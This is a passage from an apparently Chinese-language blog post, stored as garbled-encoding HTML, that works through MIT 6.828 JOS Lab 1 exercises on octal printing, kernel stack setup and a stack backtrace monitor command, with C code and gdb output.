¸å¿ƒä¸º <code>vprintfmt()</code> å‡½æ•°ï¼Œä¸»è¦æ˜¯ç”¨ä¸€ä¸ªæœ‰ç©·è‡ªåŠ¨çŠ¶æ€æœºè§£ææ ¼å¼åŒ–å­—ç¬¦ä¸²å¹¶ä»æ ˆä¸Šè¯»å–å‚æ•°è¾“å‡ºã€‚</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 8ï¼Œè¡¥å……æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰“å°ä¸­çš„ <code>%o</code> å‚æ•°çš„å®ç°</p><blockquote><p>Exercise 8. We have omitted a small fragment of code - the code necessary to print octal numbers using patterns of the form â€œ%oâ€. Find and fill in this code fragment.</p></blockquote><p>xv6 éå¸¸è´´å¿ƒåœ°å°†æ•°å­—è¾“å‡ºå®ç°ä¸ºä¸€ä¸ªæ— å‰ç¼€çš„å¤šè¿›åˆ¶è¾“å‡ºå‡½æ•° <code>printnum()</code> ï¼Œå‚è€ƒ glibc ä¸­ printf çš„ 8 è¿›åˆ¶è¾“å‡ºæ˜¯æ²¡æœ‰å‰ç¼€çš„ï¼Œæˆ‘ä»¬åªéœ€è¦ä»æ ˆä¸Šè·å–å¯¹åº”æ•°å€¼ã€è®¾ç½® baseåç›´æ¥è·³è½¬è°ƒç”¨å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (unsigned) octal</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">    <span class="comment">// Replace this with your code.</span></span><br><span class="line">    num = getuint(&amp;ap, lflag);</span><br><span class="line">    base = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">goto</span> number;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">number:</span><br><span class="line">    printnum(putch, putdat, num, base, width, padc);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>å†…æ ¸å…¥å£ç‚¹æ˜¯ <code>kern/entry.S</code>ï¼Œä¹‹åä¼šè°ƒç”¨åˆ° <code>kern/init.c</code> ä¸­çš„ <code>i386_init()</code>ï¼Œå…¶ä¸­æœ‰ä¸€å¥è°ƒç”¨äº† %o çš„è¾“å‡ºè¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cprintf(<span class="string">&quot;6828 decimal is %o octal!\n&quot;</span>, <span class="number">6828</span>);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ make clean ä¹‹åé‡æ–° make å† make qemuï¼ŒæŸ¥çœ‹æ•ˆæœï¼ŒæˆåŠŸå®ç° %o çš„è¾“å‡ºåŠŸèƒ½ï¼š</p><p><img src="https://s2.loli.net/2022/03/15/T8WRyaDCi1blp9M.png" alt="image.png"></p><p>æœ€åæ˜¯ 6.828 çš„ä¸€äº›ç»ƒä¹ é¢˜ï¼š</p><ol><li><p>Explain the interface betweenÂ printf.cÂ andÂ console.c. Specifically, what function doesÂ console.cÂ export? How is this function used byÂ printf.c?</p><p><code>console.c</code> æä¾›äº†å•ä¸ªå­—ç¬¦è¾“å‡ºçš„å‡½æ•° <code>cputchar()</code>ï¼Œåœ¨ <code>printf.c</code> ä¸­å°è£…ä¸º <code>putch()</code> å‡½æ•°è¿›è¡Œå•ä¸ªå­—ç¬¦çš„è¾“å‡º</p></li><li><p>Explain the following fromÂ console.c:</p><p>1 if (crt_pos &gt;&#x3D; CRT_SIZE) {<br>2 int i;<br>3 memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t));<br>4 for (i &#x3D; CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>5 crt_buf[i] &#x3D; 0x0700 | â€˜ â€˜;<br>6 crt_pos -&#x3D; CRT_COLS;<br>7 }</p><p>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯<strong>åœ¨å…‰æ ‡è¶…å‡º 80 x 24 æ˜¾ç¤ºåŒºåŸŸæ—¶è¿›è¡Œæ»šå±</strong>ï¼Œä¸»è¦åŸç†å°±æ˜¯å°†ç¬¬ä¸€è¡Œå¾€åçš„æ•°æ®éƒ½å‘å‰ç§»åŠ¨ä¸€è¡Œï¼Œå…‰æ ‡å‘å‰æ¸…ç©ºä¸€è¡Œçš„æ˜¾å­˜ä¸ºç©ºæ ¼åå‘å‰ç§»åŠ¨ä¸€è¡Œï¼ˆè¡Œå®½ 80 å­—ç¬¦ï¼‰</p></li><li><p>For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCCâ€™s calling convention on the x86.</p><p>Trace the execution of the following code step-by-step:</p><p>int x &#x3D; 1, y &#x3D; 3, z &#x3D; 4;<br>cprintf(â€œx %d, y %x, z %d\nâ€, x, y, z);</p><ul><li><p>In the call to <code>cprintf()</code>, to what does <code>fmt</code> point? To what does <code>ap</code> point?</p><p><del>äºŒè¿›åˆ¶é€‰æ‰‹çš„é€åˆ†é¢˜ï¼Œ</del>æŒ‡å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æŒ‡é’ˆä¸ xã€yã€z ä¸‰ä¸ªå‚æ•°éƒ½åœ¨æ ˆä¸Šï¼Œ<code>fmt</code> æŒ‡é’ˆæŒ‡å‘å­˜æ”¾æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä½äº .data æ®µä¸Šï¼Œ<code>ap</code> åˆ™æŒ‡å‘æ ˆä¸Šçš„å‚æ•° x</p></li><li><p>List (in order of execution) each call to <code>cons_putc</code>, <code>va_arg</code>, and <code>vcprintf</code>. For <code>cons_putc</code>, list its argument as well. For <code>va_arg</code>, list what <code>ap</code> points to before and after the call. For <code>vcprintf</code> list the values of its two arguments.</p><p><del>é¢˜ç›®å¤ªé•¿ä¸çœ‹ã€‚</del> <code>cons_putc</code> çš„å‚æ•°ä¸ºè¦è¾“å‡ºçš„å­—ç¬¦çš„æ•°æ®ï¼Œå®šä¹‰ä¸ºä¸€ä¸ª int ç±»å‹ï¼Œå®é™…ä¸Šåªç”¨åˆ°äº†ä½ 2 å­—èŠ‚ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º ASCII ç ï¼Œç¬¬äºŒä¸ªå­—èŠ‚ä¸ºæ˜¾ç¤ºçš„å­—ç¬¦é¢œè‰²ä¸èƒŒæ™¯è‰²ï¼›å¯¹äº <code>va_arg</code> è€Œè¨€ï¼Œ<code>ap</code>æŒ‡å‘æ ˆä¸Šçš„æŸä¸ªä½ç½®ï¼Œè¿™ä¸ªä½ç½®ä¸Šåº”å½“å­˜æ”¾ç€æˆ‘ä»¬çš„å¯å˜é•¿å‚æ•°ç»„ä¸­çš„æŸä¸ªå‚æ•°ï¼Œåœ¨è°ƒç”¨åå…¶ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ªå‚æ•°ï¼›<code>vcprintf</code> çš„ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯ <code>va_arg</code> å®¹å™¨</p></li></ul></li><li><p>Run the following code.</p><p>unsigned int i &#x3D; 0x00646c72;<br>cprintf(â€œH%x Wo%sâ€, 57616, &amp;i);</p><p>What is the output? Explain how this output is arrived at in the step-by-step manner of the previous exercise. <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Hereâ€™s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Hereâ€™s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>å°†ä»£ç æ·»åŠ åˆ° <code>init.c</code> ä¸­ï¼Œå®æµ‹è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">He110 World</span><br></pre></td></tr></table></figure><p>57616 ä½œä¸º 16 è¿›åˆ¶è¾“å‡ºä¸º e110ï¼Œè€Œ å˜é‡ i çš„å€¼è¢«ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è§£æï¼ˆæˆ‘ä»¬è¾“å…¥çš„å‚æ•°ä¸ºæŒ‡å‘ i çš„æŒ‡é’ˆï¼‰ï¼Œå› æ­¤è¾“å‡º â€œrldâ€ï¼›å¦‚æœæ˜¯å¤§ç«¯åºçš„è¯å‰è€…ä¸ä¼šæœ‰å˜åŒ–è€Œåè€…å› ä¸ºç›´æ¥ç¢°åˆ° â€œ\0â€ äºæ˜¯ä»€ä¹ˆä¹Ÿä¸è¾“å‡º</p></li><li><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><p>cprintf(â€œx&#x3D;%d y&#x3D;%dâ€, 3);</p><p>yä¼šæ˜¯ä¸€ä¸ªç›¸å¯¹éšæœºçš„å€¼ï¼Œæœ‰ä¸€å®šæ¦‚ç‡ä¼šæ˜¯ä¸€ä¸ªæŒ‡å‘æ ˆä¸Šçš„æŒ‡é’ˆï¼ˆold rbpï¼‰ï¼Œå…³é”®å¾—çœ‹ç¼–è¯‘å™¨ç”Ÿæˆçš„ä»£ç ï¼›è¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨è°ƒç”¨ cprintf æ—¶åœ¨æ ¼å¼å­—ç¬¦ä¸²ä¸­å†™æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä½†æˆ‘ä»¬åªä¼ äº†ä¸€ä¸ªå‚æ•°ï¼Œcprintf ä¼šä»æ ˆä¸Šå­˜æ”¾ 3 çš„ä½ç½®å†å¾€åè¯»ä¸€ä¸ªå‚æ•°æ‰“å°å‡ºæ¥</p></li><li><p>Letâ€™s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change <code>cprintf</code> or its interface so that it would still be possible to pass it a variable number of arguments?</p><p>ä½¿ç”¨æœ€åä¸€ä¸ªå‚æ•°æ¥æŒ‡å®šå‚æ•°çš„æ•°é‡å³å¯ã€‚</p></li></ol><p>æœ€åè¿˜æœ‰ä¸ªæ‰“å°ä¸åŒé¢œè‰²çš„ Challengeï¼Œæ‡’å¾—åšäº†</p><h3 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h3><p>è¿™ä¸€èŠ‚ä¸»è¦è®² x86 ä¸‹ C çš„å‡½æ•°è¿è¡Œæ—¶æ ˆä¸è°ƒç”¨çº¦å®šï¼Œå¹¶ç¼–å†™ä¸€ä¸ªèƒ½å¤Ÿæ‰“å°å †æ ˆ backtrace çš„å‡½æ•°ï¼ˆç±»ä¼¼äº Linux å†…æ ¸ crash ä»¥åæ‰“å°é”™è¯¯çš„é‚£ç§å‡½æ•°ï¼‰</p><p>é¦–å…ˆæ˜¯ Exercise 9ï¼Œæ‰¾åˆ°å†…æ ¸æ ˆåˆå§‹åŒ–çš„ä»£ç ã€å†…æ ¸æ ˆåœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œä»¥åŠå†…æ ¸ä¿ç•™æ ˆç©ºé—´çš„æ–¹æ³•ä¸å †æ ˆæŒ‡é’ˆè¢«åˆå§‹åŒ–æŒ‡å‘è¯¥ç©ºé—´çš„ä½ç½®</p><blockquote><p>Exercise 9. Determine where the kernel initializes its stack, and exactly where in memory its stack is located. How does the kernel reserve space for its stack? And at which â€œendâ€ of this reserved area is the stack pointer initialized to point to?</p></blockquote><p>åœ¨å†…æ ¸å…¥å£å‡½æ•°ä¸­åœ¨è°ƒç”¨ <code>i386_init()</code> ä¹‹å‰æœ‰ä¸€æ®µä»£ç åˆå§‹åŒ–äº†å†…æ ¸æ ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Clear the frame pointer register (EBP)</span><br><span class="line"># so that once we get into debugging C code,</span><br><span class="line"># stack backtraces will be terminated properly.</span><br><span class="line">movl    $0x0,%ebp            # nuke frame pointer</span><br><span class="line"></span><br><span class="line"># Set the stack pointer</span><br><span class="line">movl    $(bootstacktop),%esp</span><br><span class="line"></span><br><span class="line"># now to C code</span><br><span class="line">call    i386_init</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸Šæ‰‹è°ƒè¯•ä¸€ä¸‹ï¼Œç»“æœå¦‚ä¸‹ï¼Œæˆ‘ä»¬çœ‹åˆ°å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆespï¼‰æŒ‡å‘ <code>0xf0110000</code>ï¼Œè€Œæ ˆå¸§æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆebpï¼‰æŒ‡å‘ 0 åœ°å€ï¼Œå…³äºè¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¹‹é—´çš„å…³ç³»ç¬”è€…ä¸å†èµ˜å™ï¼Œè¯·å„ä½è¯»è€…è‡ªè¡Œå¤ä¹  C å‡½æ•°è°ƒç”¨æ ˆç›¸å…³çŸ¥è¯†ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬çš„å†…æ ¸æ ˆè¢«åˆå§‹åŒ–åˆ°å†…å­˜é«˜åœ°å€ä¸­ä¸€ä¸ªå›ºå®šçš„ä½ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">relocated () at kern/entry.S:74</span><br><span class="line">74        movl    $0x0,%ebp            # nuke frame pointer</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0xf0100034 &lt;relocated+5&gt;:    mov    $0xf0110000,%esp</span><br><span class="line">relocated () at kern/entry.S:77</span><br><span class="line">77        movl    $(bootstacktop),%esp</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0xf0100039 &lt;relocated+10&gt;:    call   0xf01000aa &lt;i386_init&gt;</span><br><span class="line">80        call    i386_init</span><br><span class="line">(gdb) info registers</span><br><span class="line">eax            0xf010002f          -267386833</span><br><span class="line">ecx            0x0                 0</span><br><span class="line">edx            0xffffff40          -192</span><br><span class="line">ebx            0x10094             65684</span><br><span class="line">esp            0xf0110000          0xf0110000 &lt;entry_pgtable&gt;</span><br><span class="line">ebp            0x0                 0x0</span><br><span class="line">esi            0x10094             65684</span><br><span class="line">edi            0x0                 0</span><br><span class="line">eip            0xf0100039          0xf0100039 &lt;relocated+10&gt;</span><br><span class="line">eflags         0x86                [ PF SF ]</span><br><span class="line">cs             0x8                 8</span><br><span class="line">ss             0x10                16</span><br><span class="line">ds             0x10                16</span><br><span class="line">es             0x10                16</span><br><span class="line">fs             0x10                16</span><br><span class="line">gs             0x10                16</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>6.828 æ–‡æ¡£ä¸­å‘æˆ‘ä»¬æ­ç¤ºäº†æ ˆå›æº¯çš„åŸç†ï¼šæŒ‰ç…§ C å‡½æ•°è°ƒç”¨æ ˆçš„ç›¸å…³çº¦å®šï¼ŒebpæŒ‡é’ˆæŒ‡å‘æ ˆåº•ï¼Œè¿™ä¸ªä½ç½®ä¸Šå­˜æ”¾äº†ä¸Šä¸€å±‚è°ƒç”¨çš„ ebpï¼Œå†å¾€åä¸€ä¸ªä½ç½®å­˜æ”¾çš„æ˜¯è¯¥å‡½æ•°çš„è¿”å›åœ°å€ï¼Œå³ä¸Šå±‚è°ƒç”¨å‡½æ•°ä¸­è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°çš„æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œå› æ­¤åˆ©ç”¨ ebp æˆ‘ä»¬ä¾¿å¯ä»¥å›æº¯å¤šå±‚å‡½æ•°è°ƒç”¨æ ˆ</p><p>ä¸‹é¢çœ‹ Exercise 10ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬é€šè¿‡è°ƒè¯•æ„ŸçŸ¥ C å‡½æ•°è°ƒç”¨æ ˆ</p><blockquote><p>Exercise 10.Â To become familiar with the C calling conventions on the x86, find the address of the <code>test_backtrace</code> function inÂ obj&#x2F;kern&#x2F;kernel.asm, set a breakpoint there, and examine what happens each time it gets called after the kernel starts. How many 32-bit words does each recursive nesting level of <code>test_backtrace</code> push on the stack, and what are those words?</p><p>Note that, for this exercise to work properly, you should be using the patched version of QEMU available on the <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">tools</a> page or on Athena. Otherwise, youâ€™ll have to manually translate all breakpoint and memory addresses to linear addresses.</p></blockquote><p>ç„¶åæ˜¯ Exercise 11ï¼Œè®©æˆ‘ä»¬è¡¥å…¨å®ç° <code>mon_backtrace()</code></p><blockquote><p>Exercise 11.Â Implement the backtrace function as specified above. Use the same format as in the example, since otherwise the grading script will be confused. When you think you have it working right, runÂ make gradeÂ to see if its output conforms to what our grading script expects, and fix it if it doesnâ€™t. <em>After</em> you have handed in your Lab 1 code, you are welcome to change the output format of the backtrace function any way you like.</p><p>If you use <code>read_ebp()</code>, note that GCC may generate â€œoptimizedâ€ code that calls <code>read_ebp()</code> <em>before</em> <code>mon_backtrace()</code>â€˜s function prologue, which results in an incomplete stack trace (the stack frame of the most recent function call is missing). While we have tried to disable optimizations that cause this reordering, you may want to examine the assembly of <code>mon_backtrace()</code> and make sure the call to <code>read_ebp()</code> is happening after the function prologue.</p></blockquote><p>æˆ‘ä»¬éœ€è¦å®ç°æ‰“å°å¦‚ä¸‹æ ¼å¼çš„æ ˆå›æº¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Stack backtrace:</span><br><span class="line">  ebp f0109e58  eip f0100a62  args 00000001 f0109e80 f0109e98 f0100ed2 00000031</span><br><span class="line">  ebp f0109ed8  eip f01000d6  args 00000000 00000000 f0100058 f0109f28 00000061</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸åˆå§‹åŒ–æ—¶å°† ebp è®¾ä¸ºäº†0ï¼Œè¿™æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªå¾ˆå¥½çš„ä½œä¸ºåˆ¤æ–­æ ˆå›æº¯ç»ˆæ­¢çš„æ¡ä»¶ï¼Œæœ€ç»ˆçš„æ ˆå›æº¯å‡½æ•°ä»£ç å¦‚ä¸‹ï¼Œç”±äº 6.828 è¯´ä»–ä»¬æä¾›çš„ <code>read_ebp()</code> å‡½æ•°å¯èƒ½ä¼šè¢«ç¼–è¯‘å™¨ä¼˜åŒ–æ‰æ‰€ä»¥ç¬”è€…è‡ªå·±å†™äº†å†…è”æ±‡ç¼–ï¼š</p><blockquote><p>AT &amp; T è¯­æ³•ï¼Œéå¸¸ğŸ¥šç–¼</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_backtrace</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Your code here.</span></span><br><span class="line">    <span class="type">uint32_t</span> *old_ebp, last_eip;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;movl %%ebp, %0;&quot;</span> : <span class="string">&quot;=r&quot;</span> (old_ebp))</span>;</span><br><span class="line">    cprintf(<span class="string">&quot;Stack backtrace:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (old_ebp)</span><br><span class="line">    &#123;</span><br><span class="line">        last_eip = old_ebp[<span class="number">1</span>];</span><br><span class="line">        cprintf(<span class="string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, </span><br><span class="line">            old_ebp, last_eip, old_ebp[<span class="number">2</span>], old_ebp[<span class="number">3</span>], old_ebp[<span class="number">4</span>], old_ebp[<span class="number">5</span>], old_ebp[<span class="number">6</span>]);</span><br><span class="line">        old_ebp = (<span class="type">uint32_t</span> *) old_ebp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸæ‰“å°æ ˆå›æº¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make qemu</span></span><br><span class="line">sed &quot;s/localhost:1234/localhost:26000/&quot; &lt; .gdbinit.tmpl &gt; .gdbinit</span><br><span class="line">qemu-system-i386 -drive file=obj/kern/kernel.img,index=0,media=disk,format=raw -serial mon:stdio -gdb tcp::26000 -D qemu.log </span><br><span class="line">6828 decimal is 15254 octal!</span><br><span class="line">entering test_backtrace 5</span><br><span class="line">entering test_backtrace 4</span><br><span class="line">entering test_backtrace 3</span><br><span class="line">entering test_backtrace 2</span><br><span class="line">entering test_backtrace 1</span><br><span class="line">entering test_backtrace 0</span><br><span class="line">Stack backtrace:</span><br><span class="line">  ebp f010ff18  eip f01000a5  args 00000000 00000000 00000000 f010004e f0111308</span><br><span class="line">  ebp f010ff38  eip f010007a  args 00000000 00000001 f010ff78 f010004e f0111308</span><br><span class="line">  ebp f010ff58  eip f010007a  args 00000001 00000002 f010ff98 f010004e f0111308</span><br><span class="line">  ebp f010ff78  eip f010007a  args 00000002 00000003 f010ffb8 f010004e f0111308</span><br><span class="line">  ebp f010ff98  eip f010007a  args 00000003 00000004 00000000 f010004e f0111308</span><br><span class="line">  ebp f010ffb8  eip f010007a  args 00000004 00000005 00000000 f010004e f0111308</span><br><span class="line">  ebp f010ffd8  eip f01000fc  args 00000005 00001aac 00000640 00000000 00000000</span><br><span class="line">  ebp f010fff8  eip f010003e  args 00000003 00001003 00002003 00003003 00004003</span><br><span class="line">leaving test_backtrace 0</span><br><span class="line">leaving test_backtrace 1</span><br><span class="line">//...</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯ lab 1 çš„æœ€åä¸€ä¸ªç»ƒä¹ â€”â€”Exercise 12ï¼Œè¦æ±‚æˆ‘ä»¬æ‰“å°æ ˆå›æº¯ä¿¡æ¯çš„åŒæ—¶æ‰“å°å‡½æ•°åã€å‡½æ•°ä½äºçš„æºæ–‡ä»¶åŠä»–ä»¬åœ¨æºæ–‡ä»¶ä¸­çš„è¡Œå·</p><blockquote><p>Exercise 12.Â Modify your stack backtrace function to display, for eachÂ eip, the function name, source file name, and line number corresponding to thatÂ eip.</p><p>In <code>debuginfo_eip</code>, where do _<em>STAB</em>*Â come from? This question has a long answer; to help you to discover the answer, here are some things you might want to do:</p><ul><li>look in the fileÂ kern&#x2F;kernel.ldÂ for _<em>STAB</em>*</li><li>runÂ objdump -h obj&#x2F;kern&#x2F;kernel</li><li>runÂ objdump -G obj&#x2F;kern&#x2F;kernel</li><li>runÂ gcc -pipe -nostdinc -O2 -fno-builtin -I. -MD -Wall -Wno-format -DJOS_KERNEL -gstabs -c -S kern&#x2F;init.c, and look at init.s.</li><li>see if the bootloader loads the symbol table in memory as part of loading the kernel binary</li></ul><p>Complete the implementation of <code>debuginfo_eip</code> by inserting the call to <code>stab_binsearch</code> to find the line number for an address.</p><p>Add aÂ backtraceÂ command to the kernel monitor, and extend your implementation of <code>mon_backtrace</code> to call <code>debuginfo_eip</code> and print a line for each stack frame of the form:</p><p>K&gt; backtrace<br>Stack backtrace:<br> ebp f010ff78 eip f01008ae args 00000001 f010ff8c 00000000 f0110580 00000000<br> kern&#x2F;monitor.c:143: monitor+106<br> ebp f010ffd8 eip f0100193 args 00000000 00001aac 00000660 00000000 00000000<br> kern&#x2F;init.c:49: i386_init+59<br> ebp f010fff8 eip f010003d args 00000000 00000000 0000ffff 10cf9a00 0000ffff<br> kern&#x2F;entry.S:70: +0<br>K&gt;</p><p>Each line gives the file name and line within that file of the stack frameâ€™sÂ eip, followed by the name of the function and the offset of theÂ eipÂ from the first instruction of the function (e.g.,Â monitor+106Â means the returnÂ eipÂ is 106 bytes past the beginning ofÂ monitor).</p><p>Be sure to print the file and function names on a separate line, to avoid confusing the grading script.</p><p>Tip: printf format strings provide an easy, albeit obscure, way to print non-null-terminated strings like those in STABS tables. <code>printf(&quot;%.*s&quot;, length, string)</code> prints at most <code>length</code> characters of <code>string</code>. Take a look at the printf man page to find out why this works.</p><p>You may find that some functions are missing from the backtrace. For example, you will probably see a call to <code>monitor()</code> but not to <code>runcmd()</code>. This is because the compiler in-lines some function calls. Other optimizations may cause you to see unexpected line numbers. If you get rid of theÂ -O2Â fromÂ GNUMakefile, the backtraces may make more sense (but your kernel will run more slowly).</p></blockquote><p>æˆ‘ä»¬å¦‚æœè¦ä»å¤´å®ç°è¿™ä¸ªåŠŸèƒ½çš„è¯å¯èƒ½ä¼šæœ‰ç‚¹éº»çƒ¦ï¼Œå¥½åœ¨ JOS ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå¯ä»¥å®ç°è¯¥åŠŸèƒ½çš„åº“å‡½æ•° <code>debuginfo_eip()</code>ï¼Œç›´æ¥æ‹¿æ¥ç”¨å°±è¡Œ</p><p>åœ¨æ‹¿æ¥ç”¨ä¹‹å‰æˆ‘ä»¬éœ€è¦æ³¨æ„å…¶å¹¶æœªå®ç°è¡Œå·åŠŸèƒ½ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰‹åŠ¨åœ¨ <code>kern/debug.c</code> ä¸­è¡¥å…¨å®ç°ï¼Œè¿™ä¸€å—åŸç†æ¯”è¾ƒå¤æ‚ï¼Œä¸»è¦é å…¶æä¾›çš„ <code>stab_binsearch()</code> å‡½æ•°å®ç°ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥äº†è§£ä¸€ä¸‹ stabï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Search within [lline, rline] for the line number stab.</span></span><br><span class="line"><span class="comment">// If found, set info-&gt;eip_line to the right line number.</span></span><br><span class="line"><span class="comment">// If not found, return -1.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//    There&#x27;s a particular stabs type used for line numbers.</span></span><br><span class="line"><span class="comment">//    Look at the STABS documentation and &lt;inc/stab.h&gt; to find</span></span><br><span class="line"><span class="comment">//    which one.</span></span><br><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line">stab_binsearch(stabs, &amp;lfun, &amp;rfun, N_SLINE, addr - info-&gt;eip_fn_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lfun &lt;= rfun)</span><br><span class="line">&#123;</span><br><span class="line">    info-&gt;eip_line = stabs[lfun].n_desc;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span 